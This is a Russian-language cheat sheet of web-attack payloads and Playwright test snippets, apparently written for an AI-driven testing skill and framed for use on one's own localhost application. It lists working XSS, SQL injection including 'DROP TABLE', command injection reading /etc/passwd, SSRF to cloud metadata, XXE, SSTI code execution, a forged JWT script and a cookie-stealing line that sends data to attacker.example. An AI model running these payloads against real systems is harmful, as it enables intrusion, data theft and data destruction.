# Библиотека пейлоадов и Playwright-сниппетов

Используй пейлоады как стартовую точку. Адаптируй под конкретный эндпоинт и стек. Всегда фиксируй фактический запрос и ответ как PoC.

## XSS

```html
<script>alert(document.domain)</script>
<img src=x onerror=alert(document.domain)>
"><svg/onload=alert(document.domain)>
'"><script>alert(1)</script>
javascript:alert(1)
```

Обходы экранирования (по возрастанию «агрессивности», применяй только на своём приложении):
```html
<svg onload=alert(1)>
<img src=x onerror="fetch('https://attacker.example/?c='+document.cookie)">
<iframe srcdoc="<script>alert(1)</script>">
```

Для DOM-XSS проверяй, как `location.hash`/`location.search` попадают в `innerHTML`/`eval`.

## SQL-инъекция (подтверждение)

```sql
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'#
' UNION SELECT null--
1; DROP TABLE users;--
```

Признаки: изменение набора данных, обход логина, ошибка 500 с SQL-текстом, разное время ответа. Не запускай destructive (`DROP`) — только чтение.

## NoSQL-инъекция (если Mongo-подобный слой)

```json
{"username": {"$ne": null}, "password": {"$ne": null}}
{"$where": "1==1"}
```

## Command injection

```bash
; id
&& whoami
| cat /etc/passwd
$(whoami)
`whoami`
```

## SSRF

```text
http://127.0.0.1:3000
http://localhost
http://169.254.169.254/latest/meta-data/
http://[::1]
http://0.0.0.0
http://2130706433
```

Для доказательства используй коллбэк, который видишь (свой listener `nc -lvp 8000`, webhook-сервис, или внутренний известный endpoint и сравнивай ответ/время).

## Path Traversal

```text
../../../../etc/passwd
..%2f..%2f..%2f..%2fetc%2fpasswd
....//....//....//etc/passwd
%2e%2e%2f%2e%2e%2f
```

## XXE (только если в приложении есть парсинг XML/SOAP/SVG)

```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

Ссылка вместо локального файла (blind XXE / out-of-band, через свой listener):

```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "http://attacker.example/xxe">]>
<root>&xxe;</root>
```

SVG-вариант (если загрузка SVG обрабатывается XML-парсером):

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
```

Признак: содержимое файла/ответ listener'а попадает в ответ приложения или в лог. Не используй `file://` пути к чувствительным системным файлам за пределами своего тестового окружения.

## SSTI (Server-Side Template Injection)

Базовая проверка (универсальный маркер, безопасен для большинства движков):

```text
${7*7}
{{7*7}}
<%= 7*7 %>
#{7*7}
```

Если в ответе появилось `49` — движок исполняет выражение. Далее — уточнение движка и payload для чтения окружения/RCE (только на своём приложении):

```text
# EJS
<%= process.env %>
<%= require('child_process').execSync('id') %>

# Handlebars (обычно безопасен по умолчанию, но проверяй helpers/compile с пользовательским вводом)
{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return process.env;"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.constructor.constructor (string.sub.constructor.apply 0 codelist)) as |func|}}{{func this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}

# Nunjucks
{{ range.constructor("return global.process.mainModule.require('child_process').execSync('id')")() }}

# Pug (если render с пользовательским вводом как шаблоном)
#{7*7}
```

## Prototype Pollution

В JSON-теле запроса, попадающем в глубокий merge (`_.merge`, `_.defaultsDeep`, `Object.assign` с вложенными объектами):

```json
{"__proto__": {"polluted": "1"}}
{"constructor": {"prototype": {"isAdmin": true}}}
```

Проверка эффекта: после отправки создай новый обычный объект в приложении (например, через другой запрос) и проверь, не появилось ли у него неожиданное поле (`polluted`/`isAdmin`) — признак загрязнения `Object.prototype`. Для DoS-варианта: `{"__proto__": {"toString": null}}` может вызвать падение сериализации в других частях приложения.

## Open Redirect

```text
//evil.example
/\evil.example
https:evil.example
http://legit-app.com@evil.example
https://legit-app.com.evil.example
/%2f%2fevil.example
```

Подставляй в параметры `redirect`, `next`, `returnUrl`, `continue`, `redirect_uri`. Признак: браузер/сервер уходит на внешний домен вместо ожидаемого.

## Clickjacking PoC

Если отсутствует `X-Frame-Options`/`frame-ancestors` в CSP — сохрани и открой локально HTML ниже, замени URL на целевую страницу с чувствительным действием:

```html
<!DOCTYPE html>
<html>
<head><style>
  iframe { opacity: 0.0001; position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 2; }
  button { position: absolute; top: 300px; left: 300px; z-index: 1; }
</style></head>
<body>
  <button>Нажми меня</button>
  <iframe src="https://target.example/account/delete"></iframe>
</body>
</html>
```

Если целевая кнопка внутри iframe оказывается под видимой кнопкой — clickjacking подтверждён.

## JWT `alg=none` (шаговая инструкция)

1. Раздели токен на три части по `.`: `header.payload.signature`.
2. Декодируй `header` (base64url) — получишь `{"alg":"HS256","typ":"JWT"}`.
3. Замени на `{"alg":"none","typ":"JWT"}` и закодируй обратно в base64url **без** padding (`=`).
4. Декодируй `payload`, поменяй нужные поля (например `role`/`userId`), закодируй обратно тем же способом.
5. Собери токен как `header.payload.` — с точкой в конце и **пустой** третьей частью (или вообще без неё, в зависимости от реализации).
6. Отправь запрос с этим токеном в заголовке `Authorization: Bearer <token>` — если сервер принял его без проверки подписи, уязвимость подтверждена.

```python
import base64, json

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode().rstrip("=")

header = b64url(json.dumps({"alg": "none", "typ": "JWT"}).encode())
payload = b64url(json.dumps({"sub": "1", "role": "admin"}).encode())
forged_token = f"{header}.{payload}."
print(forged_token)
```

## GraphQL

Introspection-запрос (проверка, доступна ли полная схема API в проде):

```graphql
{
  __schema {
    types {
      name
      fields { name }
    }
  }
}
```

Alias-based batching (одним HTTP-запросом — множество вызовов одного резолвера, обход rate limit на уровне запросов):

```graphql
query {
  a: login(email: "a@b.c", password: "guess1") { token }
  b: login(email: "a@b.c", password: "guess2") { token }
  c: login(email: "a@b.c", password: "guess3") { token }
}
```

## Race Condition / TOCTOU

Параллельная отправка одного и того же мутирующего запроса (например, применение промокода/списание баланса) для проверки гонки:

```python
import asyncio
from playwright.async_api import async_playwright

async def fire(ctx, url, token):
    return await ctx.request.post(url, headers={"Authorization": f"Bearer {token}"})

async def main():
    async with async_playwright() as p:
        browser = await p.chromium.launch()
        ctx = await browser.new_context()
        url = "http://localhost:3000/api/coupons/APPLY10/redeem"
        token = "<token>"
        results = await asyncio.gather(*[fire(ctx, url, token) for _ in range(20)])
        print([r.status for r in results])
        await browser.close()

asyncio.run(main())
```

Признак: купон применился более одного раза / баланс списался некорректно — сравни итоговое состояние ресурса с ожидаемым (должно быть ровно одно успешное применение).

## User enumeration / auth

Сравни ответы на login/register/recovery для существующего и несуществующего пользователя (статус, текст ошибки, время ответа).

## Playwright-сниппеты

Запуск сервера (через скилл webapp-testing):
```bash
python scripts/with_server.py --server "npm run start:api" --port 3000 --server "npm run start:frontend" --port 4200 -- python probe.py
```

Перехват и подмена заголовков/ответов:
```python
from playwright.sync_api import sync_playwright

with sync_playwright() as p:
    browser = p.chromium.launch(headless=True)
    page = browser.new_page()
    page.route("**/*", lambda route: route.continue_())
    page.on("response", lambda r: print(r.status, r.url, r.headers))
    page.goto("http://localhost:4200")
    page.wait_for_load_state("networkidle")
    browser.close()
```

Сырой HTTP-запрос с произвольными заголовками (обход браузерных ограничений):
```python
from playwright.sync_api import sync_playwright

with sync_playwright() as p:
    browser = p.chromium.launch(headless=True)
    ctx = browser.new_context()
    req = ctx.request.post(
        "http://localhost:3000/api/auth/login",
        headers={"Content-Type": "application/json", "Origin": "https://evil.example"},
        data='{"email":"a@b.c","password":"wrong"}',
    )
    print(req.status, req.headers, req.body())
    browser.close()
```

Проверка IDOR (запрос от пользователя A к ресурсу B):
```python
req = ctx.request.get(
    "http://localhost:3000/api/items/<B_id>",
    headers={"Authorization": "Bearer <token_A>"},
)
print(req.status, req.body())
```

Проверка rate limiting (N запросов подряд):
```python
for i in range(20):
    req = ctx.request.post("http://localhost:3000/api/auth/login",
                           data='{"email":"a@b.c","password":"wrong"}')
    print(i, req.status)
```

Подмена `Origin` для проверки CORS:
```python
resp = ctx.request.get("http://localhost:3000/api/private",
                       headers={"Origin": "https://evil.example"})
print(resp.headers.get("access-control-allow-origin"))
```

## curl-эквиваленты (быстро, без браузера)

```bash
curl -i -X POST http://localhost:3000/api/auth/login -H "Content-Type: application/json" -d '{"email":"a@b.c","password":"wrong"}'
curl -i http://localhost:3000/api/items/<id> -H "Authorization: Bearer <token>"
curl -i -H "Origin: https://evil.example" http://localhost:3000/api/private
```
